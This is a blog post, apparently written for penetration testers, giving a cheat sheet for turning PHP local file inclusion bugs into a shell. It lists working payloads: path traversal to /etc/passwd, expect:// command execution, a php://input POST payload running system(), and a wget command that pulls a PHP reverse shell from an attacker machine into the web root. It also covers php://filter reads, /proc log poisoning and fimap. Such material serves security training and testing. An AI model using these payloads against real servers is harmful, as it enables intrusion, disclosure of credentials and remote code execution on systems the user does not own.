---
layout: blog_item
title: "LFI Cheat Sheet"
date:   2016-04-24 11:29:10
author: Arr0way
description: 'LFI Explained and the techniques to leverage a shell from a local file inclusion vulnerability. How to get a shell from LFI'
categories: [web app penetration testing]
tags:
- LFI
- 'Web Application Penetration Testing'
---

* list element with functor item
{:toc}

## What is an LFI Vulnerability?

LFI stands for **Local File Includes** - it's a file local inclusion vulnerability that allows an attacker to include files that exist on the target web server. Typically this is exploited by abusing dynamic file inclusion mechanisms that don't sanitize user input.

Scripts that take filenames as parameters without sanitizing the user input are good candidates for LFI vulnerabilities, a good example would be the following PHP script <code>foo.php?file=image.jpg</code> which takes <code>image.jpg</code> as a parameter.  An attacker would simply replace <code>image.jpg</code> and insert a payload. Normally a directory traversal payload is used that escapes the script directory and traverses the filesystem directory structure, exposing sensitive files such as <code>foo.php?file=../../../../../../../etc/passwd</code> or sensitive files within the web application itself. Exposing sensitive information or configuration files containing SQL usernames and passwords.

Note: In some cases, depending on the nature of the LFI vulnerability it's possible to run system executables.

## How to get a Shell from LFI

Below are some techniques I've used in the past to gain a shell on systems with vulnerable LFI scripts exposed.

<hr>

### Path Traversal aka Directory Traversal

As mentioned above Traverse the filesystem directory structure to disclose sensitive information about the system that can help you gain a shell, usernames / passwords etc.

<hr>

### PHP Wrapper expect:// LFI

Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.

An example of PHP expect:

{% highlight bash%}
http://127.0.0.1/fileincl/example1.php?page=expect://ls
{% endhighlight %}


Below is the error received if the PHP expect wrapper is disabled:  

{% highlight php %}
Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
{% endhighlight %}

<hr>

### PHP Wrapper php://file

Another PHP wrapper, <code>php://input</code> your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.  

![LFI php://file hackbar](/img/blog/web-for-penetration-testers/lfi-php-file-hackbar-pentesters-labs.png)

Example:
{% highlight bash %}
http://192.168.183.128/fileincl/example1.php?page=php://input
{% endhighlight %}

Post Data payload, try something simple to start with like: <code><? system('uname -a');?></code>

Then try and download a [reverse shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/) from your attacking machine using:

{% highlight bash %}
<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
{% endhighlight %}


After uploading execute the reverse shell at <code>http://192.168.183.129/shell.php</code>

<hr>

### PHP Wrapper php://filter

Another PHP wrapper, <code>php://filter</code> in this example the output is encoded using base64, so you'll need to decode the output.

{% highlight bash %}
http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
{% endhighlight %}

<hr>

### /proc/self/environ LFI Method

If it's possible to include <code>/proc/self/environ</code> from your vulnerable LFI script, then code execution can be leveraged by manipulating the <code>User Agent</code> parameter with Burp. After the PHP code has been introduced <code>/proc/self/environ</code> can be executed via your vulnerable LFI script.

<hr>

### /proc/self/fd/ LFI Method

Similar to the previous <code>/proc/self/environ</code> method, it's possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the <code>referer</code>.

This method is a little tricky as the proc file that contains the Apache error log information changes under <code>/proc/self/fd/</code> e.g. <code>/proc/self/fd/2</code>, <code>/proc/self/fd/10</code> etc. I'd recommend brute forcing the directory structure of the /proc/self/fd/ directory with Burp Intruder + FuzzDB's [LFI-FD-Check.txt](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt) list of likely proc files, you can then monitor the returned page sizes and investigate.

<hr>

## fimap LFI Tool

fimap automates the above processes of discovering and exploiting LFI scripts. Upon discovering a vulnerable LFI script fimap will enumerate the local filesystem and search for writable log files or locations such as <code>/proc/self/environ</code>.  

<hr>

### fimap + phpinfo() Exploit

Fimap exploits PHP's temporary file creation via Local File Inclusion by abusing PHPinfo() information disclosure glitch to reveal the location of the created temporary file.

If a phpinfo() file is present, it's usually possible to get a shell, if you don't know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.


Enjoy + Share.
